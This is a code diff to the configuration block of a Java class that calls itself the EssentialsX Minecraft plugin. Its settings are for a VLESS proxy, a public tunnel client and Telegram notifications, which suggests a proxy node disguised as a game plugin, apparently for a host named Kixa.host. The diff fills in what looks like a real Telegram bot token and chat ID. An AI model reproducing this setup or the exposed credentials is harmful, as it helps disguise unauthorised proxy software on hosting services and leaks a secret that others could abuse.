@@ -27,7 +27,7 @@ public class EssentialsX extends JavaPlugin {
     // ================= 配置（编译前自行修改） =================
 
     static final String VLESS_UID = "6021c57c-fdf0-44b4-b688-135568139d30";
-    static final int VLESS_PORT = 65534;
+    static final int VLESS_PORT = 40872;
 
     // 公网隧道服务器（留空字符串则不启动隧道客户端）
     // VLESS_PORT 和 TUNNEL_LOCAL_PORT需对应
@@ -37,11 +37,11 @@ public class EssentialsX extends JavaPlugin {
     static final int TUNNEL_LOCAL_PORT = 65534;
 
     // ---- Telegram 通知（可留空） ----
-    static final String TG_TOKEN = "";
-    static final String TG_CHAT_ID = "";
+    static final String TG_TOKEN = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
+    static final String TG_CHAT_ID = "5800052646";
 
     // 服务器名称
-    static final String SERVER_NAME = "";
+    static final String SERVER_NAME = "Kixa.host法国";
 
     // =========================================================
 
